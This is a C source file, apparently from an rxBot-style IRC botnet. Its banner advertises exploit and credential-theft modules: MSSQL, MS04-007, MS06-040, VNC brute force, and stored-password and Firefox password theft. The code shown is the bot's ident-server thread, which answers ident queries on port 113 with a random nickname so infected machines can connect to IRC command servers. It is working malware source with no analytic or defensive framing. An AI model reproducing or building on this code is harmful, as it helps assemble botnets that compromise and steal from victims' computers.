/* |  _ \ \ \/ /    / |___ \ / _ \ TesT |  \/  |/ _ \|  _ \    \ \   / /___ \ 
   | |_) | \  /_____| | __) | | | |_____| |\/| | | | | | | |____\ \ / /  __) |
   |  _ <  /  \_____| |/ __/| |_| |_____| |  | | |_| | |_| |_____\ V /  / __/ 
   |_| \_\/_/\_\ BuZ|_|_____|\___/      |_|  |_|\___/|____/  BuZ  \_/  |_____|
   ---------------------------------------------------------------------------
   --MSSQL-NTPASS-SYM06010-MS04007-MS06040-VNCBRUTE-PSTORE-FIREFOX-SP2PATCH---  
   ---------------------------------------------------------------------------
               Greets To: THE REAL CODERS & The Ryan1918 Crew !!
 */ 
#include "Inc.h"
#include "Fun.h"
#include "Ext.h"
//////////////////////////////////////////////////////////////////////////////////

//////////////////////////////////////////////////////////////////////////////////
#ifndef NO_IDENT
//////////////////////////////////////////////////////////////////////////////////

//////////////////////////////////////////////////////////////////////////////////
DWORD WINAPI IdentThread(LPVOID param)
{
	char user[12], buffer[IRCLINE];

	int threadnum = (int)param;
	BOOL success = FALSE;

	SOCKET ssock,csock;

	SOCKADDR_IN ssin, csin;
	memset(&ssin, 0, sizeof(ssin));
	ssin.sin_family = AF_INET;
	ssin.sin_port = fhtons((unsigned short)113);
	ssin.sin_addr.s_addr=INADDR_ANY;

	if ((ssock = fsocket(AF_INET, SOCK_STREAM, 0)) != INVALID_SOCKET) {
		threads[threadnum].sock = ssock;
		if (fbind(ssock, (LPSOCKADDR)&ssin, sizeof(ssin)) != SOCKET_ERROR) {
			if (flisten(ssock, 5) != SOCKET_ERROR) {
				int csin_len = sizeof(csin);

				while (1) {
					if ((csock = faccept(ssock,(LPSOCKADDR)&csin,&csin_len)) == INVALID_SOCKET)
						break;

					sprintf(buffer, "1::[10IdeNtD1]:: Client connection from IP: %s:%d.", finet_ntoa(csin.sin_addr), csin.sin_port);
					addlog(buffer);

					if (frecv(csock,buffer,sizeof(buffer),0) != SOCKET_ERROR) {
						Split(buffer,0);

						memset(user, 0, sizeof(user));
						_snprintf(buffer,sizeof(buffer)," : USERID : UNIX : %s\r\n",rndnick(user, LETTERNICK, FALSE));
	
						if (fsend(csock,buffer,strlen(buffer),0) != SOCKET_ERROR)
							success = TRUE;

					}
				}
			}
		}
	}
	if (!success) {
		sprintf(buffer, "1::[10IdeNtD1]:: Error: server failed, returned: <%d>.", fWSAGetLastError());
		addlog(buffer);
	}
	fclosesocket(ssock);
	fclosesocket(csock);
	clearthread(threadnum);

	ExitThread(0);
}
//////////////////////////////////////////////////////////////////////////////////

//////////////////////////////////////////////////////////////////////////////////
#endif
